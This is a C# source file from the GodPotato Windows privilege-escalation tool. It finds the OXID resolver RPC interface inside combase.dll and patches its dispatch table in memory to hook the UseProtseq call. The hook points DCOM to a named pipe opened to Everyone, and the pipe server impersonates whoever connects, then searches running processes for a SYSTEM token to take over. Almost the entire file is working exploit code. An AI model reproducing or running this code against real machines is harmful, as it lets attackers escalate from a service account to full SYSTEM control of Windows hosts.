using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Security.Principal;
using System.Threading;
using SharpToken;
using static GodPotato.NativeAPI.NativeMethods;
using static GodPotato.NativeAPI.NewOrcbRPC;

namespace GodPotato.NativeAPI
{
    public class GodPotatoContext
    {
        private static readonly Guid orcbRPCGuid = new Guid("18f70770-8e64-11cf-9af1-0020af6e72f4");
        public IntPtr CombaseModule { get; private set; }
        public IntPtr DispatchTablePtr { get; private set; }
        public IntPtr UseProtseqFunctionPtr { get; private set; } = IntPtr.Zero;
        public uint UseProtseqFunctionParamCount { get; private set; } = 0xffffff;

        private NewOrcbRPC newOrcbRPC;
        private IntPtr[] dispatchTable = null;
        private short[] fmtStringOffsetTable = null;
        private IntPtr procString = IntPtr.Zero;
        private Delegate useProtseqDelegate;
        private WindowsIdentity systemIdentity;
        private Thread pipeServerThread;
        public TextWriter ConsoleWriter { get; private set; }
        public string PipeName { get; set; }
        public bool IsStart { get; private set; }
        public bool IsHook { get; private set; }
        public readonly string serverPipe = $"\\\\.\\pipe\\{"GodPotato"}\\pipe\\epmapper";
        public readonly string clientPipe = $"ncacn_np:localhost/pipe/{"GodPotato"}[\\pipe\\epmapper]";

        public GodPotatoContext(TextWriter consoleWriter, string pipeName)
        {
            this.PipeName = pipeName;
            this.newOrcbRPC = new NewOrcbRPC(this);
            this.ConsoleWriter = consoleWriter;

            InitContext();

            if (CombaseModule == IntPtr.Zero)
            {
                throw new Exception("No combase module found");
            }
            else if (dispatchTable == null || procString == IntPtr.Zero || UseProtseqFunctionPtr == IntPtr.Zero)
            {
                throw new Exception("Cannot find IDL structure");
            }


            /*
            
            string delegateFunName = "delegateFun" + UseProtseqFunctionParamCount;
            string funName = "fun" + UseProtseqFunctionParamCount;

            Type delegateFunType = typeof(NewOrcbRPC).GetNestedType(delegateFunName, System.Reflection.BindingFlags.Public);
            this.useProtseqDelegate = Delegate.CreateDelegate(delegateFunType, newOrcbRPC, funName);
            
             */



            // Code obfuscation support
            else if (UseProtseqFunctionParamCount == 4)
            {
                delegateFun4 df4 = newOrcbRPC.fun4;
                useProtseqDelegate = df4;
            }
            else if (UseProtseqFunctionParamCount == 5)
            {
                delegateFun5 df5 = newOrcbRPC.fun5;
                useProtseqDelegate = df5;
            }
            else if (UseProtseqFunctionParamCount == 6)
            {
                delegateFun6 df6 = newOrcbRPC.fun6;
                useProtseqDelegate = df6;
            }
            else if (UseProtseqFunctionParamCount == 7)
            {
                delegateFun7 df7 = newOrcbRPC.fun7;
                useProtseqDelegate = df7;
            }
            else if (UseProtseqFunctionParamCount == 8)
            {
                delegateFun8 df8 = newOrcbRPC.fun8;
                useProtseqDelegate = df8;
            }
            else if (UseProtseqFunctionParamCount == 9)
            {
                delegateFun9 df9 = newOrcbRPC.fun9;
                useProtseqDelegate = df9;
            }
            else if (UseProtseqFunctionParamCount == 10)
            {
                delegateFun10 df10 = newOrcbRPC.fun10;
                useProtseqDelegate = df10;
            }
            else if (UseProtseqFunctionParamCount == 11)
            {
                delegateFun11 df11 = newOrcbRPC.fun11;
                useProtseqDelegate = df11;
            }
            else if (UseProtseqFunctionParamCount == 12)
            {
                delegateFun12 df12 = newOrcbRPC.fun12;
                useProtseqDelegate = df12;
            }
            else if (UseProtseqFunctionParamCount == 13)
            {
                delegateFun13 df13 = newOrcbRPC.fun13;
                useProtseqDelegate = df13;
            }
            else if (UseProtseqFunctionParamCount == 14)
            {
                delegateFun14 df14 = newOrcbRPC.fun14;
                useProtseqDelegate = df14;
            }
            else {
                throw new Exception($"UseProtseqFunctionParamCount == ${UseProtseqFunctionParamCount}");
            
            }


        }

        protected void InitContext() {
            ProcessModuleCollection processModules = Process.GetCurrentProcess().Modules;
            foreach (ProcessModule processModule in processModules)
            {
                if (processModule.ModuleName != null && processModule.ModuleName.ToLower() == "combase.dll")
                {
                    CombaseModule = processModule.BaseAddress;

                    MemoryStream patternStream = new MemoryStream();

                    BinaryWriter binaryWriter = new BinaryWriter(patternStream);
                    binaryWriter.Write(Marshal.SizeOf(typeof(RPC_SERVER_INTERFACE)));
                    binaryWriter.Write(orcbRPCGuid.ToByteArray());
                    binaryWriter.Flush();

                    byte[] dllContent = new byte[processModule.ModuleMemorySize];
                    Marshal.Copy(processModule.BaseAddress, dllContent, 0, dllContent.Length);

                    var s = Sunday.Search(dllContent, patternStream.ToArray());


                    RPC_SERVER_INTERFACE rpcServerInterface = (RPC_SERVER_INTERFACE)Marshal.PtrToStructure(new IntPtr(processModule.BaseAddress.ToInt64() + s[0]), typeof(RPC_SERVER_INTERFACE));
                    RPC_DISPATCH_TABLE rpcDispatchTable = (RPC_DISPATCH_TABLE)Marshal.PtrToStructure(rpcServerInterface.DispatchTable, typeof(RPC_DISPATCH_TABLE));
                    MIDL_SERVER_INFO midlServerInfo = (MIDL_SERVER_INFO)Marshal.PtrToStructure(rpcServerInterface.InterpreterInfo, typeof(MIDL_SERVER_INFO));
                    DispatchTablePtr = midlServerInfo.DispatchTable;
                    IntPtr fmtStringOffsetTablePtr = midlServerInfo.FmtStringOffset;
                    procString = midlServerInfo.ProcString;
                    dispatchTable = new IntPtr[rpcDispatchTable.DispatchTableCount];
                    fmtStringOffsetTable = new short[rpcDispatchTable.DispatchTableCount];

                    for (int i = 0; i < dispatchTable.Length; i++)
                    {
                        dispatchTable[i] = Marshal.ReadIntPtr(DispatchTablePtr, i * IntPtr.Size);
                    }

                    for (int i = 0; i < fmtStringOffsetTable.Length; i++)
                    {
                        fmtStringOffsetTable[i] = Marshal.ReadInt16(fmtStringOffsetTablePtr, i * Marshal.SizeOf(typeof(short)));
                    }
                    UseProtseqFunctionPtr = dispatchTable[0];
                    UseProtseqFunctionParamCount = Marshal.ReadByte(procString, fmtStringOffsetTable[0] + 19);
                }
            }

        }

        protected void PipeServer()
        {
            IntPtr pipeServerHandle = NativeMethods.BAD_HANLE;

            IntPtr securityDescriptor;
            uint securityDescriptorSize;

            ConvertStringSecurityDescriptorToSecurityDescriptor("D:(A;OICI;GA;;;WD)", 1, out securityDescriptor, out securityDescriptorSize);

            try
            {

                NativeMethods.SECURITY_ATTRIBUTES securityAttributes = new NativeMethods.SECURITY_ATTRIBUTES();
                securityAttributes.pSecurityDescriptor = securityDescriptor;
                securityAttributes.nLength = Marshal.SizeOf(typeof(NativeMethods.SECURITY_ATTRIBUTES));
                pipeServerHandle = CreateNamedPipe(serverPipe, NativeMethods.PIPE_ACCESS_DUPLEX, NativeMethods.PIPE_TYPE_BYTE | NativeMethods.PIPE_READMODE_BYTE | NativeMethods.PIPE_WAIT, NativeMethods.PIPE_UNLIMITED_INSTANCES, 521, 0, 123, ref securityAttributes);

                ConsoleWriter.WriteLine("[*] CreateNamedPipe " + serverPipe);
                if (pipeServerHandle != BAD_HANLE)
                {
                    bool isConnect = ConnectNamedPipe(pipeServerHandle, IntPtr.Zero);

                    if ((isConnect || Marshal.GetLastWin32Error() == ERROR_PIPE_CONNECTED) && IsStart)
                    {
                        ConsoleWriter.WriteLine("[*] Pipe Connected!");
                        if (ImpersonateNamedPipeClient(pipeServerHandle))
                        {
                            systemIdentity = WindowsIdentity.GetCurrent();
                            if (systemIdentity.ImpersonationLevel <= TokenImpersonationLevel.Identification)
                            {
                                RevertToSelf();
                            }

                            ConsoleWriter.WriteLine("[*] CurrentUser: " + systemIdentity.Name);
                            ConsoleWriter.WriteLine("[*] CurrentsImpersonationLevel: " + systemIdentity.ImpersonationLevel);

                            ConsoleWriter.WriteLine("[*] Start Search System Token");

                            bool isFindSystemToken = false;

                            if (systemIdentity.ImpersonationLevel >= TokenImpersonationLevel.Impersonation)
                            {
                                SharpToken.TokenuUils.ListProcessTokens(-1, processToken => {
                                    if (processToken.SID == "S-1-5-18" && processToken.ImpersonationLevel >= TokenImpersonationLevel.Impersonation && processToken.IntegrityLevel >= SharpToken.IntegrityLevel.SystemIntegrity)
                                    {
                                        systemIdentity = new WindowsIdentity(processToken.TokenHandle);
                                        ConsoleWriter.WriteLine("[*] PID : {0} Token:0x{1:x}  User: {2} ImpersonationLevel: {3}", processToken.TargetProcessId, processToken.TargetProcessToken, processToken.UserName, processToken.ImpersonationLevel);
                                        isFindSystemToken = true;
                                        processToken.Close();
                                        return false;
                                    }
                                    processToken.Close();
                                    return true;
                                });
                            }

                            ConsoleWriter.WriteLine("[*] Find System Token : " + isFindSystemToken);

                            RevertToSelf();
                        }
                        else
                        {
                            ConsoleWriter.WriteLine($"[!] ImpersonateNamedPipeClient fail error:{Marshal.GetLastWin32Error()}");
                        }
                    }
                    else
                    {
                        ConsoleWriter.WriteLine("[!] ConnectNamedPipe timeout");
                    }

                }
                else
                {
                    ConsoleWriter.WriteLine($"[!] CreateNamedPipe fail error:{Marshal.GetLastWin32Error()}");
                }
            }
            catch (Exception e)
            {
                ConsoleWriter.WriteLine("[!] " + e.Message);
            }

            if (pipeServerHandle != BAD_HANLE)
            {
                CloseHandle(pipeServerHandle);
            }

            return;
        }

        public void Start() {
            if (IsHook && !IsStart)
            {
                pipeServerThread = new Thread(PipeServer);
                pipeServerThread.IsBackground = true;
                pipeServerThread.Start();
                IsStart = true;
            }
            else
            {
                throw new Exception("IsHook == false");
            }
        
        }

        public void HookRPC()
        {
            uint old;
            VirtualProtect(DispatchTablePtr, (uint)(IntPtr.Size * dispatchTable.Length), 0x04, out old);
            Marshal.WriteIntPtr(DispatchTablePtr, Marshal.GetFunctionPointerForDelegate(useProtseqDelegate));
            IsHook = true;
        }
        public void Restore()
        {
            if (IsHook && UseProtseqFunctionPtr != IntPtr.Zero)
            {
                Marshal.WriteIntPtr(DispatchTablePtr, UseProtseqFunctionPtr);
            }
            else
            {
                throw new Exception("IsHook == false");
            }
        }
        public void Stop()
        {
            if (IsStart)
            {
                IsStart = false;
                if (pipeServerThread.IsAlive)
                {
                    try
                    {
                        SharpToken.SECURITY_ATTRIBUTES securityAttributes = new SharpToken.SECURITY_ATTRIBUTES();
                        IntPtr pipeClientHandle = NativeMethod.CreateFileW(serverPipe, (int)(NativeMethod.GENERIC_READ | NativeMethod.GENERIC_WRITE), FileShare.ReadWrite, ref securityAttributes, FileMode.Open, 0, IntPtr.Zero);
                        FileStream stream = new FileStream(pipeClientHandle, FileAccess.ReadWrite);
                        stream.WriteByte(0xaa);
                        stream.Flush();
                        stream.Close();
                    }
                    catch (Exception e)
                    {
                        pipeServerThread.Interrupt();
                        pipeServerThread.Abort();
                    }
                }
            }
            else
            {
                throw new Exception("IsStart == false");
            }
        }

        public WindowsIdentity GetToken() {
            return systemIdentity;
        }

    }

    class NewOrcbRPC
    {
        private GodPotatoContext godPotatoContext;
        public NewOrcbRPC(GodPotatoContext godPotatoContext)
        {
            this.godPotatoContext = godPotatoContext;
        }
        public int fun(IntPtr ppdsaNewBindings, IntPtr ppdsaNewSecurity)
        {
            string[] endpoints = { godPotatoContext.clientPipe, "ncacn_ip_tcp:fuck you !" };

            int entrieSize = 3;
            for (int i = 0; i < endpoints.Length; i++)
            {
                entrieSize += endpoints[i].Length;
                entrieSize++;
            }

            int memroySize = entrieSize * 2 + 10;

            IntPtr pdsaNewBindings = Marshal.AllocHGlobal(memroySize);

            for (int i = 0; i < memroySize; i++)
            {
                Marshal.WriteByte(pdsaNewBindings, i, 0x00);
            }

            int offset = 0;

            Marshal.WriteInt16(pdsaNewBindings, offset, (short)entrieSize);
            offset += 2;
            Marshal.WriteInt16(pdsaNewBindings, offset, (short)(entrieSize - 2));
            offset += 2;

            for (int i = 0; i < endpoints.Length; i++)
            {
                string endpoint = endpoints[i];
                for (int j = 0; j < endpoint.Length; j++)
                {
                    Marshal.WriteInt16(pdsaNewBindings, offset, (short)endpoint[j]);
                    offset += 2;
                }
                offset += 2;
            }
            Marshal.WriteIntPtr(ppdsaNewBindings, pdsaNewBindings);
            
            return 0;
        }
        public delegate int delegateFun4(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3);
        public delegate int delegateFun5(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4);
        public delegate int delegateFun6(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5);
        public delegate int delegateFun7(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6);
        public delegate int delegateFun8(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7);
        public delegate int delegateFun9(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8);
        public delegate int delegateFun10(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9);
        public delegate int delegateFun11(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10);
        public delegate int delegateFun12(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10, IntPtr p11);
        public delegate int delegateFun13(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10, IntPtr p11, IntPtr p12);
        public delegate int delegateFun14(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10, IntPtr p11, IntPtr p12, IntPtr p13);
        public  int fun4(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3)
        {
            return fun(p2, p3);
        }
        public  int fun5(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4)
        {
            return fun(p3, p4);
        }
        public  int fun6(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5)
        {
            return fun(p4, p5);
        }
        public  int fun7(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6)
        {
            return fun(p5, p6);
        }
        public  int fun8(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7)
        {
            return fun(p6, p7);
        }
        public  int fun9(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8)
        {
            return fun(p7, p8);
        }
        public  int fun10(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9)
        {
            return fun(p8, p9);
        }
        public  int fun11(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10)
        {
            return fun(p9, p10);
        }
        public  int fun12(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10, IntPtr p11)
        {
            return fun(p10, p11);
        }
        public  int fun13(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10, IntPtr p11, IntPtr p12)
        {
            return fun(p11, p12);
        }
        public  int fun14(IntPtr p0, IntPtr p1, IntPtr p2, IntPtr p3, IntPtr p4, IntPtr p5, IntPtr p6, IntPtr p7, IntPtr p8, IntPtr p9, IntPtr p10, IntPtr p11, IntPtr p12, IntPtr p13)
        {
            return fun(p12, p13);
        }


    }
    class Sunday
    {
        private static int ALPHA_BET = 512;

        private static int[] ComputeOccurence(byte[] pattern)
        {
            int[] table = new int[ALPHA_BET];
            for (char a = (char)0; a < (char)ALPHA_BET; a++)
            {
                table[a] = -1;
            }

            for (int i = 0; i < pattern.Length; i++)
            {
                byte a = pattern[i];
                table[a] = i;
            }
            return table;
        }

        public static List<int> Search(byte[] text, byte[] pattern)
        {
            List<int> matchs = new List<int>();

            int i = 0;
            int[] table = ComputeOccurence(pattern);
            while (i <= text.Length - pattern.Length)
            {
                int j = 0;
                while (j < pattern.Length && text[i + j] == pattern[j])
                {
                    j++;
                }
                if (j == pattern.Length)
                {
                    matchs.Add(i);
                }
                i += pattern.Length;
                if (i < text.Length)
                {
                    i -= table[text[i]];
                }
            }
            return matchs;
        }
    }

}
